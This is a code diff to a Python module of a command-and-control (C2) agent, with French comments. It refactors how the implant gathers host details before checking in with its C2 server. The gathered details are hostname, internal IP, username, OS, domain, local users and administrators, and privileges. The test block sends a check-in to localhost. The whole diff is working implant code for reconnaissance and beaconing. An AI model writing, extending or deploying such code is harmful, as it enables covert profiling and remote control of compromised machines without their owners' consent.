@@ -12,6 +12,9 @@ import uuid
 import socket # Pour récupérer le hostname
 import platform # Pour récupérer des infos OS
 
+# from agent.core import system_info # ANCIEN
+from ..core import system_info # MODIFIÉ: Import relatif pour system_info
+
 # Ce fichier ne devrait plus définir de SERVER_URL global ici.
 # Il sera passé par agent_main.py
 
@@ -37,37 +40,34 @@ def get_agent_id():
         pass 
     return agent_id
 
-def get_host_info():
-    """Récupère des informations basiques sur l'hôte."""
-    try:
-        hostname = socket.gethostname()
-    except Exception:
-        hostname = "unknown_hostname"
-    
-    try:
-        # Tente de récupérer l'IP locale (peut être complexe et multi-interfaces)
-        # Ceci est une méthode simple, pourrait ne pas être la bonne IP externe/pertinente
-        internal_ip = socket.gethostbyname(hostname) 
-    except socket.gaierror:
-        internal_ip = "127.0.0.1" # Fallback
-
-    os_target = f"{platform.system()} {platform.release()}"
-    # Username pourrait être récupéré avec getpass.getuser() mais nécessite une gestion des erreurs
-    # ou des méthodes spécifiques à l'OS pour les contextes de service.
-    username = "unknown_user" # Placeholder
-    try:
-        import getpass
-        username = getpass.getuser()
-    except Exception:
-        pass # Garder unknown_user si getpass échoue
-        
-    return {
-        "hostname": hostname,
-        "internal_ip": internal_ip,
-        "username": username,
-        "os_target": os_target
-        # "agent_version": "0.1.0" # Peut être ajouté ici ou dans agent_main
+def get_base_agent_info(agent_version: str):
+    """Récupère les informations de base et détaillées sur l'hôte."""
+    basic_info = {
+        # "agent_id": get_agent_id(), # L'ID est géré par agent_main
+        "agent_version": agent_version,
+        # Les autres infos (hostname, ip, user, os) viendront de system_info
     }
+    
+    detailed_sys_info = system_info.get_all_system_info()
+    
+    # Fusionner les dictionnaires, detailed_sys_info peut écraser des clés de basic_info si conflit
+    # (ex: hostname, os), ce qui est souhaité car get_all_system_info est plus complet.
+    agent_data = {**basic_info, **detailed_sys_info}
+    
+    # Assurer que les clés attendues par le serveur sont présentes, même si None
+    # Le modèle Agent sur le serveur attend: hostname, internal_ip, username, os_target, domain_name, local_users, local_admins, current_user_privileges
+    agent_data['os_target'] = agent_data.pop('os', None) # Renommer 'os' en 'os_target'
+    agent_data.setdefault('internal_ip', None) # Pas explicitement dans get_all_system_info, mais était dans l'ancien get_host_info
+    
+    # Tentative de récupérer l'IP interne si elle n'est pas déjà là (peut être redondant si platform.node() est l'IP)
+    if not agent_data.get('internal_ip'):
+        try:
+            # Ceci est une méthode simple, pourrait ne pas être la bonne IP externe/pertinente
+            agent_data['internal_ip'] = socket.gethostbyname(agent_data.get("hostname", ""))
+        except socket.gaierror:
+            agent_data['internal_ip'] = "127.0.0.1" # Fallback
+
+    return agent_data
 
 def send_checkin(server_url: str, agent_id: str, agent_info: dict):
     """Envoie une requête de check-in au serveur C2."""
@@ -97,8 +97,8 @@ if __name__ == "__main__":
     test_server_url = "http://localhost:8000" # Pour test uniquement
     my_agent_id = get_agent_id()
     print(f"ID Agent: {my_agent_id}")
-    host_info = get_host_info()
-    print(f"Informations de l'hôte: {host_info}")
+    base_agent_info = get_base_agent_info("0.1.0-test") # NOUVEAU, passer une version test
+    print(f"Informations de l'agent: {base_agent_info}")
     
     print(f"Envoi d'un check-in test à {test_server_url}...")
-    send_checkin(test_server_url, my_agent_id, host_info)
+    send_checkin(test_server_url, my_agent_id, base_agent_info) # NOUVEAU
